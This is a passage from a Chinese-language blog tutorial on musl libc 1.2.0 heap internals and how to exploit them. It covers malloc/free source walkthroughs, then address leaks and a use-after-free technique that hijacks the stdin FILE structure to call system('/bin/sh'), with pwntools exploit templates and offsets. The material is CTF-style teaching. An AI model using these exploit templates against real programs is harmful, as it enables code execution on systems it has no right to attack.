size相差的数值属于bins[j]的范围内，即split与self属于同一个bin</span></span><br><span class="line">	<span class="keyword">if</span> (bin_index(n1-n) != j) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//切割出一块大小为n的chunk用来返回</span></span><br><span class="line">	next = NEXT_CHUNK(self);</span><br><span class="line">	split = (<span class="keyword">void</span> *)((<span class="keyword">char</span> *)self + n);</span><br><span class="line"></span><br><span class="line">	split-&gt;prev = self-&gt;prev;</span><br><span class="line">	split-&gt;next = self-&gt;next;</span><br><span class="line">	split-&gt;prev-&gt;next = split;</span><br><span class="line">	split-&gt;next-&gt;prev = split;</span><br><span class="line">	split-&gt;psize = n | C_INUSE;</span><br><span class="line">	split-&gt;csize = n1-n;</span><br><span class="line">	next-&gt;psize = n1-n;</span><br><span class="line">	self-&gt;csize = n | C_INUSE;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>取个名字好听点：</p>
<p><code>J：search_bin_idx</code></p>
<p><code>I：calc_bin_idx</code></p>
<p><code>n：need_size</code></p>
<p>总的条件如下：</p>
<ul>
<li><p><code>search_bin_idx</code>大于 40</p>
</li>
<li><p><code>search_bin_idx</code>与<code>calc_bin_idx</code>相隔 3 个 bin 或以上，或者<code>search_bin_idx</code>等于63且<code>bins[search_bin_idx].head-&gt;size - need_size &gt; MMAP_THRESHOLD(0x38000)</code></p>
</li>
<li><p><code>bins[search_bin_idx].head-&gt;size - need_size</code>的值在<code>bins[search_bin_idx]</code>中</p>
</li>
</ul>
<p>即在将Chunk拿出bin之前，先进行切割赋值，设置对应的指针，然后才解链，chunk还是从bin中找到的chunk，之后在unbin中进行inuse位的修改。</p>

        <h4 id="③trim"   >
          <a href="#③trim" class="heading-link"><i class="fas fa-link"></i></a><a href="#③trim" class="headerlink" title="③trim"></a>③trim</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.0  src/malloc/malloc.c中</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">trim</span><span class="params">(struct chunk *self, <span class="keyword">size_t</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">size_t</span> n1 = CHUNK_SIZE(self);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span>, *<span class="title">split</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//类似于unsortebin中如果多出来的size小于0x10，那就直接返回给用户一样</span></span><br><span class="line">    <span class="comment">//DONTCARE(0x10)，也就是确保回收的chunk的size至少为0x10，chunk至少0x20对齐</span></span><br><span class="line">	<span class="keyword">if</span> (n &gt;= n1 - DONTCARE) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	next = NEXT_CHUNK(self);</span><br><span class="line">	split = (<span class="keyword">void</span> *)((<span class="keyword">char</span> *)self + n);</span><br><span class="line"></span><br><span class="line">	split-&gt;psize = n | C_INUSE;</span><br><span class="line">	split-&gt;csize = n1-n | C_INUSE;</span><br><span class="line">	next-&gt;psize = n1-n | C_INUSE;</span><br><span class="line">	self-&gt;csize = n | C_INUSE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将多余的chunk释放到 bin</span></span><br><span class="line">	__bin_chunk(split);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h3 id="2-free"   >
          <a href="#2-free" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-free" class="headerlink" title="(2)free"></a>(2)free</h3>
      <p>这个比较简单，如果csize没有设置标志位，就有两种可能，要么是double free，要么是mmap出来的chunk。所以进入unmap_chunk函数仔细判断，否则就是设置了标志位，正常进入__bin_chunk函数进行释放。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">////v1.2.0  src/malloc/malloc.c中</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free</span><span class="params">(<span class="keyword">void</span> *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!p) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">self</span> =</span> MEM_TO_CHUNK(p);</span><br><span class="line">	<span class="comment">//判断csize是否设置了标志位</span></span><br><span class="line">	<span class="keyword">if</span> (IS_MMAPPED(self))</span><br><span class="line">		unmap_chunk(self);<span class="comment">//检测psize字段</span></span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		__bin_chunk(self);<span class="comment">//正常释放</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h4 id="①unmap-chunk"   >
          <a href="#①unmap-chunk" class="heading-link"><i class="fas fa-link"></i></a><a href="#①unmap-chunk" class="headerlink" title="①unmap_chunk"></a>①unmap_chunk</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">////v1.2.0  src/malloc/malloc.c中</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">unmap_chunk</span><span class="params">(struct chunk *self)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">size_t</span> extra = self-&gt;psize;</span><br><span class="line">	<span class="keyword">char</span> *base = (<span class="keyword">char</span> *)self - extra;</span><br><span class="line">	<span class="keyword">size_t</span> len = CHUNK_SIZE(self) + extra;</span><br><span class="line">	<span class="comment">/* Crash on double free */</span></span><br><span class="line">    <span class="comment">//如果psize字段设置inuse位，直接crash</span></span><br><span class="line">	<span class="keyword">if</span> (extra &amp; <span class="number">1</span>) a_crash();</span><br><span class="line">    <span class="comment">//否则作为mmap chunk进入释放函数</span></span><br><span class="line">	__munmap(base, len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h4 id="②-bin-chunk"   >
          <a href="#②-bin-chunk" class="heading-link"><i class="fas fa-link"></i></a><a href="#②-bin-chunk" class="headerlink" title="②__bin_chunk"></a>②__bin_chunk</h4>
      <p>正常的释放函数，首先合并 chunk 前后的空闲 chunk、设置 binmap 和 chunk 标志位，最后将 chunk 插入到对应的 bin 链表中。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">////v1.2.0  src/malloc/malloc.c中</span></span><br><span class="line"><span class="keyword">void</span> __bin_chunk(struct chunk *self)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span> =</span> NEXT_CHUNK(self);</span><br><span class="line">	<span class="keyword">size_t</span> final_size, new_size, size;</span><br><span class="line">	<span class="keyword">int</span> reclaim=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	final_size = new_size = CHUNK_SIZE(self);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Crash on corrupted footer (likely from buffer overflow) */</span></span><br><span class="line">   	<span class="comment">//若下一个 chunk 的 psize 不等于 self 的 csize，则 crash</span></span><br><span class="line">    <span class="comment">//相当于检测pre_size和size</span></span><br><span class="line">	<span class="keyword">if</span> (next-&gt;psize != self-&gt;csize) a_crash();</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//检测该chunk的前后是否处于空闲状态</span></span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="comment">//对于上一个chunk，检测当前chunk的psize位</span></span><br><span class="line">        <span class="comment">//对于下一个chunk，检测下一个chunk的csize位</span></span><br><span class="line">		<span class="keyword">if</span> (self-&gt;psize &amp; next-&gt;csize &amp; C_INUSE) &#123;</span><br><span class="line">            <span class="comment">//前后处于use状态，那么对当前chunk进行释放即可</span></span><br><span class="line">            <span class="comment">//清除当前chunk的inuse位，下一个chunk的psize位</span></span><br><span class="line">			self-&gt;csize = final_size | C_INUSE;</span><br><span class="line">			next-&gt;psize = final_size | C_INUSE;</span><br><span class="line">			i = bin_index(final_size);</span><br><span class="line">			lock_bin(i);</span><br><span class="line">			lock(mal.free_lock);</span><br><span class="line">            <span class="comment">//退出循环检测</span></span><br><span class="line">			<span class="keyword">if</span> (self-&gt;psize &amp; next-&gt;csize &amp; C_INUSE)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			unlock(mal.free_lock);</span><br><span class="line">			unlock_bin(i);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//向上合并空闲的chunk</span></span><br><span class="line">		<span class="keyword">if</span> (alloc_rev(self)) &#123;</span><br><span class="line">			self = PREV_CHUNK(self);</span><br><span class="line">			size = CHUNK_SIZE(self);</span><br><span class="line">			final_size += size;</span><br><span class="line">			<span class="keyword">if</span> (new_size+size &gt; RECLAIM &amp;&amp; (new_size+size^size) &gt; size)</span><br><span class="line">				reclaim = <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//向下合并空闲的chunk</span></span><br><span class="line">		<span class="keyword">if</span> (alloc_fwd(next)) &#123;</span><br><span class="line">			size = CHUNK_SIZE(next);</span><br><span class="line">			final_size += size;</span><br><span class="line">			<span class="keyword">if</span> (new_size+size &gt; RECLAIM &amp;&amp; (new_size+size^size) &gt; size)</span><br><span class="line">				reclaim = <span class="number">1</span>;</span><br><span class="line">			next = NEXT_CHUNK(next);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//设置对应binmap的标志位，bins[i]</span></span><br><span class="line">	<span class="keyword">if</span> (!(mal.binmap &amp; <span class="number">1ULL</span>&lt;&lt;i))</span><br><span class="line">		a_or_64(&amp;mal.binmap, <span class="number">1ULL</span>&lt;&lt;i);</span><br><span class="line"></span><br><span class="line">	self-&gt;csize = final_size;</span><br><span class="line">	next-&gt;psize = final_size;</span><br><span class="line">	unlock(mal.free_lock);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将当前chunk放到bins[i]的尾部，FILO的形式</span></span><br><span class="line">	self-&gt;next = BIN_TO_CHUNK(i);</span><br><span class="line">	self-&gt;prev = mal.bins[i].tail;</span><br><span class="line">	self-&gt;next-&gt;prev = self;</span><br><span class="line">	self-&gt;prev-&gt;next = self;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Replace middle of large chunks with fresh zero pages */</span></span><br><span class="line">	<span class="keyword">if</span> (reclaim) &#123;</span><br><span class="line">		<span class="keyword">uintptr_t</span> a = (<span class="keyword">uintptr_t</span>)self + SIZE_ALIGN+PAGE_SIZE<span class="number">-1</span> &amp; -PAGE_SIZE;</span><br><span class="line">		<span class="keyword">uintptr_t</span> b = (<span class="keyword">uintptr_t</span>)next - SIZE_ALIGN &amp; -PAGE_SIZE;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 1</span></span><br><span class="line">		__madvise((<span class="keyword">void</span> *)a, b-a, MADV_DONTNEED);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">		__mmap((<span class="keyword">void</span> *)a, b-a, PROT_READ|PROT_WRITE,</span><br><span class="line">			MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	unlock_bin(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="4-静态堆内存"   >
          <a href="#4-静态堆内存" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-静态堆内存" class="headerlink" title="4.静态堆内存"></a>4.静态堆内存</h2>
      <p>在Libc初始化时，如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __dls3(<span class="keyword">size_t</span> *sp)</span><br><span class="line">&#123;</span><br><span class="line">    [...]</span><br><span class="line">    <span class="comment">// ldso/dynlink.c L1839-L1840</span></span><br><span class="line">    <span class="comment">/* Donate unused parts of app and library mapping to malloc */</span></span><br><span class="line">    reclaim_gaps(&amp;app);</span><br><span class="line">    reclaim_gaps(&amp;ldso);</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>会调用<code>reclaim_gaps</code>函数查找程序和 libc 库的空闲内存，通常是位于Data段上，该函数中会调用<code>__malloc_donate</code>函数将空闲内存释放到 bin中。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ldso/dynlink.c L526-L552</span></span><br><span class="line"><span class="comment">/* A huge hack: to make up for the wastefulness of shared libraries</span></span><br><span class="line"><span class="comment"> * needing at least a page of dirty memory even if they have no global</span></span><br><span class="line"><span class="comment"> * data, we reclaim the gaps at the beginning and end of writable maps</span></span><br><span class="line"><span class="comment"> * and &quot;donate&quot; them to the heap. */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">reclaim</span><span class="params">(struct dso *dso, <span class="keyword">size_t</span> start, <span class="keyword">size_t</span> end)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 避开 RELRO 段</span></span><br><span class="line">    <span class="keyword">if</span> (start &gt;= dso-&gt;relro_start &amp;&amp; start &lt; dso-&gt;relro_end) start = dso-&gt;relro_end;</span><br><span class="line">    <span class="keyword">if</span> (end   &gt;= dso-&gt;relro_start &amp;&amp; end   &lt; dso-&gt;relro_end) end = dso-&gt;relro_start;</span><br><span class="line">    <span class="keyword">if</span> (start &gt;= end) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">char</span> *base = laddr_pg(dso, start);</span><br><span class="line">    <span class="comment">// 使用 __malloc_donate 函数将内存释放到 bin 中</span></span><br><span class="line">    __malloc_donate(base, base+(end-start));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">reclaim_gaps</span><span class="params">(struct dso *dso)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Phdr *ph = dso-&gt;phdr;</span><br><span class="line">    <span class="keyword">size_t</span> phcnt = dso-&gt;phnum;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历每一个段</span></span><br><span class="line">    <span class="keyword">for</span> (; phcnt--; ph=(<span class="keyword">void</span> *)((<span class="keyword">char</span> *)ph+dso-&gt;phentsize)) &#123;</span><br><span class="line">        <span class="comment">// 条件 1：段不属于可加载段（PT_LOAD）</span></span><br><span class="line">        <span class="keyword">if</span> (ph-&gt;p_type!=PT_LOAD) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="comment">// 条件 2：段可读可写</span></span><br><span class="line">        <span class="keyword">if</span> ((ph-&gt;p_flags&amp;(PF_R|PF_W))!=(PF_R|PF_W)) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="comment">// 在段所属的内存页中，将段前后的空闲内存传递给 reclaim 函数</span></span><br><span class="line">        reclaim(dso, ph-&gt;p_vaddr &amp; -PAGE_SIZE, ph-&gt;p_vaddr);</span><br><span class="line">        reclaim(dso, ph-&gt;p_vaddr+ph-&gt;p_memsz,</span><br><span class="line">            ph-&gt;p_vaddr+ph-&gt;p_memsz+PAGE_SIZE<span class="number">-1</span> &amp; -PAGE_SIZE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>初始化结束后，在bins中会多出几个chunk</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202171127046.png" alt="image-20220217112724849"></p>
<p>不一定是三个chunk，多少个都有可能，主要看程序或者libc中是否存在空闲的内存。之后再进行堆内存分配时，就会在这个基础上进行分配，而非在所有bins都是空的状态进行分配。</p>

        <h2 id="5-利用方式"   >
          <a href="#5-利用方式" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-利用方式" class="headerlink" title="5.利用方式"></a>5.利用方式</h2>
      
        <h3 id="1-泄露地址"   >
          <a href="#1-泄露地址" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-泄露地址" class="headerlink" title="(1)泄露地址"></a>(1)泄露地址</h3>
      
        <h4 id="①基于静态堆内存"   >
          <a href="#①基于静态堆内存" class="heading-link"><i class="fas fa-link"></i></a><a href="#①基于静态堆内存" class="headerlink" title="①基于静态堆内存"></a>①基于静态堆内存</h4>
      <p>那么基于静态堆内存的存在，由于最开始进行分配是在存在静态堆内存的情况下分配的，所以如果申请的chunk的size依据申请规则可以对静态堆内存进行切割，那么就会进行切割，由于是切割的chunk，那么此时返回的chunk的就会自然而然带上地址。</p>
<p>同样的，当碰上静态堆内存初始化之后，在一个bins中同时存在程序中的chunk和libc中的chunk时，我们将该chunk切割或者申请出来，就可以同时泄露Libc地址和程序ELF地址了。</p>

        <h4 id="②基于bins"   >
          <a href="#②基于bins" class="heading-link"><i class="fas fa-link"></i></a><a href="#②基于bins" class="headerlink" title="②基于bins"></a>②基于bins</h4>
      <p>前面提到，释放到bins中head指针下chunk必然会带上libc地址，那么直接申请回来就可以进行Libc地址的泄露</p>

        <h3 id="2-getshell"   >
          <a href="#2-getshell" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-getshell" class="headerlink" title="(2)getshell"></a>(2)getshell</h3>
      
        <h4 id="①UAF"   >
          <a href="#①UAF" class="heading-link"><i class="fas fa-link"></i></a><a href="#①UAF" class="headerlink" title="①UAF"></a>①UAF</h4>
      
        <h5 id="方法一："   >
          <a href="#方法一：" class="heading-link"><i class="fas fa-link"></i></a><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h5>
      <p>这种情况可以直接通过改掉位于bin中head头部chunk的next和prev指针，然后从该bin中申请chunk，通过unbin函数中的如下操作即可进行任意地址任意写，其中的c也就是bin中的head指向的chunk。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c-&gt;prev-&gt;next = c-&gt;next;</span><br><span class="line">c-&gt;next-&gt;prev = c-&gt;prev;</span><br></pre></td></tr></table></div></figure>

<p>相关的exp模板如下</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bins_a0h_addr = libc_base + <span class="number">0x292b28</span></span><br><span class="line">stdin_addr = libc_base + <span class="number">0x292200</span></span><br><span class="line">add_malloc(<span class="number">0x1000</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,p64(bins_a0h_addr-<span class="number">0x10</span>)+p64(stdin_addr-<span class="number">0x10</span>))</span><br><span class="line">add_malloc(<span class="number">0x1000</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,p64(stdin_addr-<span class="number">0x10</span>)+p64(bins_a0h_addr-<span class="number">0x10</span>))</span><br><span class="line">add_malloc(<span class="number">0x1000</span>)</span><br></pre></td></tr></table></div></figure>

<p>可以连续用两次也没啥问题，由于我们劫持了这个改写指针的操作，所以在相对于的bin结构中的head和tail指针并没有改变，所以仍然可以使用。</p>
<p>用两次的原因是需要在<code>stdin-&gt;prev</code>和<code>stdin-&gt;next</code>都写下一个可写地址，这样之后再从对应bin的head中申请出来时，经过unbin函数中的指针赋值操作不会出错，否则就会出现不可写或者零地址取值操作导致失败。</p>
<p>以上操作结束后就可以看到在bins[4]，也是0xa0大小对应的bin中的head指针已经被我们修改为stdin_addr-0x10，同时对应的stdin结构体的prev和next指针也是可写地址</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202171857586.png" alt="image-20220217185755489"></p>
<p>之后从中bins[4]中申请chunk即可申请出stdin结构体，之后对应修改所需数据即可</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">f-&gt;wpos != f-&gt;wbase</span><br><span class="line">f-&gt;flag = &quot;/bin/shx00&quot;</span><br><span class="line">f-&gt;write = system</span><br><span class="line">f-&gt;lock=0</span><br></pre></td></tr></table></div></figure>

<p>相应exp模板如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add_malloc(0xa0-0x20)</span><br><span class="line">edit(3,0x50+0x50,&quot;/bin/sh\x00&quot;+p64(0)*4+p64(0x1)+p64(0x0)+p64(0x2)+p64(0x0)+p64(system_addr) + \</span><br><span class="line">	p64(0x0)*8)</span><br></pre></td></tr></table></div></figure>

<p>最后调用exit()函数即可，调用链为<code>exit()-&gt;__stdio_exit_needed()(//或者是__stdio_exit)-&gt;close_file(__stdin_used)-&gt;f-&gt;write(f, 0, 0);</code>这里的f即是传入的stdin</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// src/stdio/__stdio_exit.c</span><br><span class="line">static void close_file(FILE *f)</span><br><span class="line">&#123;</span><br><span class="line">	if (!f) return;</span><br><span class="line">	FFINALLOCK(f);</span><br><span class="line">	if (f-&gt;wpos != f-&gt;wbase) f-&gt;write(f, 0, 0);</span><br><span class="line">	if (f-&gt;rpos != f-&gt;rend) f-&gt;seek(f, f-&gt;rpos-f-&gt;rend, SEEK_CUR);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void __stdio_exit(void)</span><br><span class="line">&#123;</span><br><span class="line">	FILE *f;</span><br><span class="line">	for (f=*__ofl_lock(); f; f=f-&gt;next) close_file(f);</span><br><span class="line">	close_file(__stdin_used);</span><br><span class="line">	close_file(__stdout_used);</span><br><span class="line">	close_file(__stderr_used);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>不过由于<code>FFINALLOCK(f);</code>的存在，如果进入这个函数不知道为什么会崩溃，也可能是某些设置上的问题吗？所以为了不进入这个函数，那么需要将<code>f-&gt;lock</code>置零即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202171832664.png" alt="image-20220217183236401"></p>
<p>最后即可调用f-&gt;write，即劫持的system函数，rdi为stdin结构体，来getshell</p>
<p>最终小模板如下</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">bins_a0h_addr = libc_base + <span class="number">0x292b28</span></span><br><span class="line">stdin_addr = libc_base + <span class="number">0x292200</span></span><br><span class="line">add_malloc(<span class="number">0x1000</span>)</span><br><span class="line">add_malloc(<span class="number">0xa0</span>-<span class="number">0x20</span>)</span><br><span class="line">add_malloc(<span class="number">0xa0</span>-<span class="number">0x20</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">dbg()</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,p64(bins_a0h_addr-<span class="number">0x10</span>)+p64(stdin_addr-<span class="number">0x10</span>))</span><br><span class="line">add_malloc(<span class="number">0x1000</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,p64(stdin_addr-<span class="number">0x10</span>)+p64(bins_a0h_addr-<span class="number">0x10</span>))</span><br><span class="line">add_malloc(<span class="number">0x1000</span>)</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">add_malloc(<span class="number">0xa0</span>-<span class="number">0x20</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0x50</span>+<span class="number">0x50</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x1</span>)+p64(<span class="number">0x0</span>)+p64(<span class="number">0x2</span>)+p64(<span class="number">0x0</span>)+p64(system_addr) + \</span><br><span class="line">	p64(<span class="number">0x0</span>)*<span class="number">8</span>)</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">exit()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></div></figure>


        <h5 id="方法二："   >
          <a href="#方法二：" class="heading-link"><i class="fas fa-link"></i></a><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h5>
      <p>这个相对方法一就简单很多，只需要一个任意地址写即可，思路也是类似的。</p>
